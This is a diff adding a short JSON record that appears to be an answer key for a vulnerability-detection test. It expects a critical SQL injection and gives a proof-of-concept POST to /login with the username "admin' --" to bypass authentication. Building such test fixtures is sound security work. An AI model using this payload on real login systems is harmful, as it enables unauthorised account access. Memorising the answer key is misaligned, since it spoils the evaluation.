@@ -1,0 +1,6 @@
+{
+  "expected_vulnerability": "SQLi",
+  "severity": "Critical",
+  "oracle": "auth_bypass_or_query_tampering",
+  "poc": {"method": "POST", "path": "/login", "body": {"username": "admin' --", "password": "x"}, "indicator": "auth_bypass"}
+}
